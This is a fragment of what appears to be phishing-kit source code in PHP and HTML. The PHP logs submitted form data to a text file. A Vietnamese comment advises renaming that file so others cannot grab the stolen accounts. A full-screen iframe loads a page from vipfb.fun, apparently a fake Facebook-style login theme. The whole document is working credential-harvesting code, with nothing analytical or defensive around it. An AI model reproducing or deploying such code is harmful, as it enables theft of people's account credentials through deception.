...
//   $type=='';
 $time = date('H:i:s d/m/Y');
    ...
    $test = fopen("coaaaa.txt","a");//đổi tên file hu.txt này để tránh trường hợp người khác vào lấy acc
    fwrite($test,$body);
    fclose($test);
    	$huongdz['num']++;
...
<div class="d-grid gap-2">
 ...
 <div class="myIframe"> 
  ...
  <!--đổi giao diện ở đây-->
 <!--đổi giao diện ở đây-->
   <iframe style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden" src="https://vipfb.fun/theme/20.html" id="iframe"> </iframe> 
